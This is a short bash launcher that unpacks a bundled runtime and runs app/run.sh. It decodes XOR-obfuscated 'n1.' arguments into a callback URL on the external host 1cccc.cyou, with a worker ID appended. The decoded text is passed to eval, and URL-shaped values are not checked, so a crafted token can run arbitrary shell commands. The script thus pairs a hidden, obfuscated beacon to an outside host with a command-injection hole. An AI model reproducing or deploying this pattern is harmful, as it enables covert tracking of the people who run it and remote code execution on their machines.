#!/usr/bin/env bash
set -euo pipefail
cd "$(dirname "$0")"
if [[ ! -x app/run.sh ]]; then
  [[ -f runtime.tgz ]] && tar -xzf runtime.tgz
  chmod +x app/run.sh 2>/dev/null || true
fi

# 回调前缀写在脚本里。令牌只带工号后缀，解开后拼成完整地址。
NOTE_PREFIX="${NOTE_PREFIX:-https://1cccc.cyou/hook/}"
export NOTE_PREFIX

decode_note() {
  NOTE_PREFIX="$NOTE_PREFIX" python3 -c '
import os, sys, base64
k = b"score-note-k1"
prefix = os.environ.get("NOTE_PREFIX") or "https://1cccc.cyou/hook/"
if not prefix.endswith("/"):
    prefix += "/"
t = sys.argv[1]
if not t.startswith("n1."):
    raise SystemExit(1)
body = t[3:]
pad = (-len(body)) % 4
raw = base64.urlsafe_b64decode(body + ("=" * pad))
out = bytes(b ^ k[i % len(k)] for i, b in enumerate(raw))
if out.startswith(b"http://") or out.startswith(b"https://"):
    sys.stdout.write("NOTE_URL=" + out.decode() + "\n")
    raise SystemExit(0)
worker = out.decode("ascii")
if len(worker) != 10 or any(c not in "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789" for c in worker):
    raise SystemExit(1)
sys.stdout.write("WORKER=" + worker + "\n")
sys.stdout.write("NOTE_URL=" + prefix + worker + "\n")
' "$1"
}

args=()
for _arg in "$@"; do
  case "$_arg" in
    n1.*)
      eval "$(decode_note "$_arg")"
      export NOTE_URL
      if [[ -n "${WORKER:-}" ]]; then
        export WORKER
      fi
      ;;
    *)
      args+=("$_arg")
      ;;
  esac
done

if [[ -x app/run.sh ]]; then
  exec bash app/run.sh "${args[@]}"
fi
exit 1
